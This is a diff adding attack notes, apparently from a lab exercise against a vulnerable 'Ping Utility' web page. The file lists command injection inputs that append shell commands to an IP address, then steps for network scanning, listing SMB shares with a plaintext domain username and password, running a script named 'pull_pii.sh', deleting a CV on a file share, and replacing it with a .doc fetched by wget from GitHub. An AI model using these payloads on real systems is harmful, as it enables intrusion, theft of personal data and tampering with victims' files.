@@ -1,0 +1,40 @@
+Ping Utility:
+
+    127.0.0.1
+    127.0.0.1; whoami
+    127.0.0.1; pwd
+    127.0.0.1; cd ../../; pwd; ls -a
+    127.0.0.1; ifconfig -a | grep netmask
+    127.0.0.1; which nmap
+    127.0.0.1; nmap -sP 192.168.122.0/24
+    127.0.0.1; nmap -p 135 192.168.122.7
+    127.0.0.1; smbclient -N '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3 -c ls
+    127.0.0.1; smbclient -N '//192.168.122.7/Private_Files' -W HACKYSOC -U wier%frantic-Folly3 -c ls
+
+    UPullScripts - ll 
+
+    127.0.0.1; cd ../../hackable/uploads; chmod 775 pull_scripts.sh
+    127.0.0.1; ../../hackable/uploads/pull_scripts.sh
+
+Shell:
+
+    cat pull_pii.sh
+    ./pull_pii.sh
+    ls /var/tmp
+    smbclient '//192.168.122.7/c$' -W HACKYSOC -U wier%frantic-Folly3
+        cd Private_Files
+        del rogeradamsCV
+        dir
+        exit
+    cd /var/tmp
+    wget https://github.com/rnewt6926/Ingram/blob/main/rogeradamsCV.doc
+    ll
+    smbclient '//192.168.122.7/Private_Files' -c 'lcd /var/tmp; put rogeradamsCV.doc' -W HACKYSOC -U wier%frantic-Folly3
+
+
+Wait...
+
+
+
+
+
